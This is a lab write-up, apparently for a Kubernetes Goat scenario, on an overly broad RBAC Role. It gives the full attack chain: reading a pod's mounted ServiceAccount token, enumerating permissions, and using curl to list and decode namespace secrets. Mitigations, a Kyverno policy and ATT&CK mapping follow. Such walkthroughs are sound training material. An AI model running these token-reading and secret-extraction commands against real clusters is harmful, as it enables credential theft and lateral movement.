# Scenario 16: RBAC Misconfiguration

## Overview

This challenge demonstrates a common Kubernetes security vulnerability: overly permissive Role-Based Access Control (RBAC) configurations. When developers use wildcards (`*`) in RBAC rules instead of scoping to specific resources, they inadvertently grant far more access than intended - allowing attackers to read secrets, enumerate the cluster, and potentially escalate privileges.

## Attack Vector

Kubernetes RBAC controls what actions ServiceAccounts can perform. The attack chain:

1. Compromise a pod (via any vulnerability)
2. Discover the pod's ServiceAccount and its mounted credentials
3. Enumerate RBAC permissions using the Kubernetes API
4. Exploit overly permissive rules to access sensitive resources (secrets)

## Tools Used

- **kubectl** - Kubernetes CLI (not available in container, simulated via API)
- **curl** - Direct Kubernetes API queries
- **Kubernetes MCP** - Cluster inspection and command execution

## Attack Walkthrough

### Step 1: Identify the Target Pod

Listed pods to find the scenario workload in the `big-monolith` namespace:

```bash
kubectl get pods -n big-monolith
```

**Result**:
```
NAME                                        READY   STATUS    RESTARTS   AGE
hunger-check-deployment-68d68dc578-w5x57    1/1     Running   19         12d
```

### Step 2: Discover the ServiceAccount

Every pod runs as a ServiceAccount. Inspected the pod spec to find which one:

```bash
kubectl get pod hunger-check-deployment-68d68dc578-w5x57 -n big-monolith -o jsonpath='{.spec.serviceAccountName}'
```

**Result**:
```
big-monolith-sa
```

The pod runs as a custom ServiceAccount `big-monolith-sa` rather than the default - indicating someone deliberately configured RBAC for this workload.

### Step 3: Locate the Mounted Credentials

Kubernetes automatically mounts ServiceAccount tokens into pods. From inside the container:

```bash
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
```

**Result**:
```
lrwxrwxrwx 1 root root   13 Dec 20 11:20 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Dec 20 11:20 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Dec 20 11:20 token -> ..data/token
```

**Key Files**:
| File | Purpose |
|------|---------|
| `token` | JWT for API authentication |
| `ca.crt` | Cluster CA certificate for TLS |
| `namespace` | Pod's namespace |

### Step 4: Identify API Server Location

Kubernetes injects environment variables for API discovery:

```bash
env | grep KUBERNETES
```

**Result**:
```
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.96.0.1:443
```

### Step 5: Enumerate RBAC Permissions

With no `kubectl` available, queried the API directly using the mounted token:

```bash
curl -s \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"big-monolith"}}' \
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
```

**Result** (key section):
```json
{
  "resourceRules": [
    {
      "verbs": ["get", "watch", "list"],
      "apiGroups": [""],
      "resources": ["*"]
    }
  ]
}
```

**Critical Finding**: The ServiceAccount has `get`, `watch`, `list` on ALL resources (`*`) in the core API group!

### Step 6: Examine the RBAC Configuration

Inspected the Role causing this misconfiguration:

```yaml
# Role: secret-reader (big-monolith namespace)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: secret-reader
  namespace: big-monolith
rules:
- apiGroups:
  - ""           # Core API group
  resources:
  - '*'          # ALL resources - THE PROBLEM!
  verbs:
  - get
  - watch
  - list
```

```yaml
# RoleBinding: secret-reader-binding
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: secret-reader-binding
  namespace: big-monolith
roleRef:
  kind: Role
  name: secret-reader
subjects:
- kind: ServiceAccount
  name: big-monolith-sa
```

**The Irony**: The Role is named `secret-reader`, suggesting the developer only wanted to read secrets. But by using `resources: ["*"]` instead of `resources: ["secrets"]`, they granted access to everything!

### Step 7: Extract Secrets

Listed all secrets in the namespace:

```bash
curl -s \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces/big-monolith/secrets
```

**Result**:
```json
{
  "items": [
    {
      "metadata": { "name": "vaultapikey" },
      "data": { "k8svaultapikey": "azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=" }
    },
    {
      "metadata": { "name": "webhookapikey" },
      "data": { "k8swebhookapikey": "azhzLWdvYXQtZGZjZjYzMDUzOTU1M2VjZjk1ODZmZGZkYTE5NjhmZWM=" }
    }
  ]
}
```

### Step 8: Decode the Secrets

Kubernetes stores secret values as base64:

```bash
echo "azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=" | base64 -d
echo "azhzLWdvYXQtZGZjZjYzMDUzOTU1M2VjZjk1ODZmZGZkYTE5NjhmZWM=" | base64 -d
```

**Result**:
```
k8s-goat-[REDACTED-vaultapikey]
k8s-goat-[REDACTED-webhookapikey]
```

## Attack Chain Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                    RBAC Exploitation Flow                       │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  1. INITIAL ACCESS                                              │
│     Compromise pod (hunger-check) via any vulnerability         │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  2. CREDENTIAL DISCOVERY                                        │
│     /var/run/secrets/kubernetes.io/serviceaccount/token         │
│     ServiceAccount: big-monolith-sa                             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  3. PERMISSION ENUMERATION                                      │
│     SelfSubjectRulesReview API                                  │
│     Found: get/list/watch on ALL core resources                 │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  4. SECRET EXTRACTION                                           │
│     GET /api/v1/namespaces/big-monolith/secrets                 │
│     Retrieved: vaultapikey, webhookapikey                       │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  5. IMPACT                                                      │
│     - Vault API access (credential theft)                       │
│     - Webhook API access (potential code execution)             │
│     - Lateral movement to other services                        │
└─────────────────────────────────────────────────────────────────┘
```

## Key Lessons

### RBAC Components Explained

| Component | Scope | Purpose |
|-----------|-------|---------|
| **ServiceAccount** | Namespace | Identity for pods |
| **Role** | Namespace | Defines permissions within one namespace |
| **ClusterRole** | Cluster | Defines permissions cluster-wide |
| **RoleBinding** | Namespace | Grants Role to ServiceAccount |
| **ClusterRoleBinding** | Cluster | Grants ClusterRole cluster-wide |

### The Wildcard Problem

```yaml
# VULNERABLE - grants access to ALL resources
resources:
- '*'

# SECURE - grants access only to needed resources
resources:
- pods
- configmaps
```

The core API group (`""`) includes:
- Pods, Services, Endpoints
- **Secrets** (the prize for attackers)
- ConfigMaps, PersistentVolumeClaims
- Nodes, Namespaces (if ClusterRole)

### Common RBAC Mistakes

| Mistake | Risk | Fix |
|---------|------|-----|
| `resources: ["*"]` | Access to secrets, pods, everything | List specific resources |
| `verbs: ["*"]` | Includes create, delete, patch | List specific verbs needed |
| ClusterRoleBinding instead of RoleBinding | Namespace escape | Use namespace-scoped bindings |
| Default ServiceAccount with permissions | All pods get access | Create per-workload ServiceAccounts |
| `automountServiceAccountToken: true` (default) | Token always available | Disable when API access not needed |

### Permission Enumeration Techniques

| Method | Command/API |
|--------|-------------|
| kubectl (if available) | `kubectl auth can-i --list` |
| API (from pod) | `POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews` |
| Check specific action | `kubectl auth can-i get secrets` |
| As another SA | `kubectl auth can-i --list --as=system:serviceaccount:ns:sa` |

## Mitigations

### 1. Principle of Least Privilege

```yaml
# BEFORE (vulnerable)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: secret-reader
rules:
- apiGroups: [""]
  resources: ["*"]        # Too broad!
  verbs: ["get", "list", "watch"]

# AFTER (secure)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: config-reader
rules:
- apiGroups: [""]
  resources: ["configmaps"]  # Only what's needed
  verbs: ["get"]             # Only read, not list/watch
  resourceNames: ["app-config"]  # Even specific resources!
```

### 2. Disable Token Automount

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: no-api-access
spec:
  automountServiceAccountToken: false  # No token mounted
  containers:
  - name: app
    image: myapp
```

### 3. Use Dedicated ServiceAccounts

```yaml
# Create specific SA per workload
apiVersion: v1
kind: ServiceAccount
metadata:
  name: hunger-check-sa
  namespace: big-monolith
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: hunger-check
spec:
  template:
    spec:
      serviceAccountName: hunger-check-sa  # Not default!
```

### 4. Audit RBAC Regularly

```bash
# List all RoleBindings with their roles
kubectl get rolebindings -A -o wide

# Check what a ServiceAccount can do
kubectl auth can-i --list --as=system:serviceaccount:big-monolith:big-monolith-sa

# Find overly permissive roles
kubectl get roles -A -o json | jq '.items[] | select(.rules[].resources[] == "*")'

# Use rbac-tool for visualization
kubectl krew install rbac-tool
kubectl rbac-tool viz --outformat dot | dot -Tpng > rbac.png
```

### 5. Policy Enforcement

```yaml
# Kyverno policy to block wildcard resources
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-wildcard-resources
spec:
  validationFailureAction: enforce
  rules:
  - name: block-wildcard-resources
    match:
      resources:
        kinds:
        - Role
        - ClusterRole
    validate:
      message: "Wildcard resources are not allowed in RBAC rules"
      pattern:
        rules:
          - resources:
              - "!*"
```

## Real-World Incidents

| Incident | Description | Impact |
|----------|-------------|--------|
| **Tesla Kubernetes Breach (2018)** | Overly permissive RBAC + exposed dashboard | Cryptomining on cloud infrastructure |
| **Shopify Bug Bounty (2020)** | RBAC misconfiguration in partner apps | Potential access to merchant data |
| **Various CVEs** | Default ServiceAccounts with excessive permissions | Cluster-wide compromise |

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Valid Accounts: Cloud Accounts | T1078.004 | Using ServiceAccount token for API access |
| Unsecured Credentials | T1552 | Secrets readable via misconfigured RBAC |
| Account Discovery | T1087 | Enumerating ServiceAccounts and permissions |
| Permission Groups Discovery | T1069 | Discovering RBAC roles and bindings |
| Access Token Manipulation | T1134 | Using mounted ServiceAccount tokens |

## OWASP Kubernetes Top 10 Alignment

| Risk | Relevance |
|------|-----------|
| **K01: Insecure Workload Configurations** | ServiceAccount with excessive permissions |
| **K08: Secrets Management** | Secrets accessible due to RBAC misconfiguration |
| **K02: Supply Chain Vulnerabilities** | Compromised pod can access cluster secrets |

## Commands Reference

```bash
# Check current context permissions
kubectl auth can-i --list

# Check specific permission
kubectl auth can-i get secrets -n big-monolith

# Check as another ServiceAccount
kubectl auth can-i get secrets --as=system:serviceaccount:big-monolith:big-monolith-sa

# List all Roles in namespace
kubectl get roles -n big-monolith -o yaml

# List all RoleBindings
kubectl get rolebindings -n big-monolith -o yaml

# Find ServiceAccount for a pod
kubectl get pod <name> -o jsonpath='{.spec.serviceAccountName}'

# API query from inside pod (no kubectl)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/<ns>/secrets

# Self-permission check via API
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  -X POST -H 'Content-Type: application/json' \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"<ns>"}}' \
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
```

## References

- [Kubernetes RBAC Documentation](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [OWASP Kubernetes Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html)
- [CIS Kubernetes Benchmark - RBAC Section](https://www.cisecurity.org/benchmark/kubernetes)
- [MITRE ATT&CK for Containers](https://attack.mitre.org/matrices/enterprise/containers/)
- [rbac-tool - RBAC Visualization](https://github.com/alcideio/rbac-tool)
- [kubectl-who-can - Permission Checker](https://github.com/aquasecurity/kubectl-who-can)
